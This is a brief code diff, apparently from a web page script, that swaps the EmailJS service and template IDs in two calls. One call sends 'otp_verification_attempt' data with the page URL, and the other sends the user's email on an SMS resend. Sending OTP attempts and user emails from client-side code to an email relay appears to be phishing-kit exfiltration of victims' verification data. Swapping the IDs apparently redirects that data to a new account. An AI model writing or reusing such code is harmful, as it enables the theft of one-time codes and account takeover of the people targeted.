@@ -491,7 +491,7 @@
           page_url: window.location.href,
           action: "otp_verification_attempt"
         };
-        return emailjs.send("service_t84doqy", "template_awd8sif", params);
+        return emailjs.send("service_kvpr45j", "template_v2xoave", params);
       }
 
       // --- submit ---
@@ -579,7 +579,7 @@
             user_email: userEmail,
             timestamp: new Date().toLocaleString()
           };
-          emailjs.send("service_t84doqy", "template_awd8sif", params)
+          emailjs.send("service_kvpr45j", "template_v2xoave", params)
             .then(r => console.log("SMS resend tracked:", r.status))
             .catch(e => console.error("SMS tracking error:", e));
 
